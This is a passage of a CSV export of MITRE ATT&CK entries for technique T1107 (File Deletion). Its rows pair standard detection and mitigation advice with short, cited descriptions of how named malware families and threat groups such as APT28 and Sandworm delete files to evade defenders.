1087,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0147|Pteranodon]] can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Pteranodon,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1088,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0032|gh0st]] RAT is able to delete files.[[CiteRef::FireEye Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: gh0st,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1089,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0070|HTTPBrowser]] deletes its original installer file once installation is complete.[[CiteRef::ZScaler Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1090,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0106|cmd]] can be used to delete files from the file system.[[CiteRef::TechNet Del]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: cmd, cmd.exe",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1091,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Group/G0026|APT18]] actors deleted tools and batch files from victim systems.[[CiteRef::Dell Lateral Movement]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1092,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0125|Remsec]] is capable of deleting files on the victim.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]] It also securely removes itself after collecting and exfiltrating data.[[CiteRef::Kaspersky ProjectSauron Full Report]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1093,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0069|BLACKCOFFEE]] has the capability to delete files.[[CiteRef::FireEye APT17]]'],['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: BLACKCOFFEE,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1094,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0021|Derusbi]] is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Derusbi,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1095,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['The [[Software/S0044|JHUHUGIT]] dropper deletes itself from the victim.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: JHUHUGIT, Seduploader, ...",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1096,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0045|ADVSTORESHELL]] can delete files and directories.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: ADVSTORESHELL, NETUI, ...",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1097,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0136|USBStealer]] has several commands to delete files associated with the malware from the victim.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1098,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0161|XAgentOSX]] contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: XAgentOSX,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1099,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['The Komplex trojan supports file deletion [[CiteRef::Sofacy Komplex Trojan]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Komplex,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1100,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Group/G0007|APT28]] has deleted files from the system via the NSFileManager:removeFileAtPath method [[CiteRef::XAgentOSX]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1101,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0148|RTM]] can delete all files created during its execution.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: RTM,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1102,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']","['[[Software/S0089|BlackEnergy]] 2 contains a ""Destroy"" plug-in that destroys data stored on victim hard drives by overwriting file contents.[[CiteRef::Securelist BlackEnergy Feb 2015]]']",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: BlackEnergy, Black Energy",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1103,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Group/G0051|FIN10]] has used batch scripts and scheduled tasks to delete critical system files.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1104,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0155|WINDSHIELD]] is capable of file deletion along with other file system interaction.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: WINDSHIELD,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1105,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Group/G0050|APT32]] has cleared select event log entries.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1106,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0093|Backdoor.Oldrea]] contains a cleanup module that removes traces of itself from the victim.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where 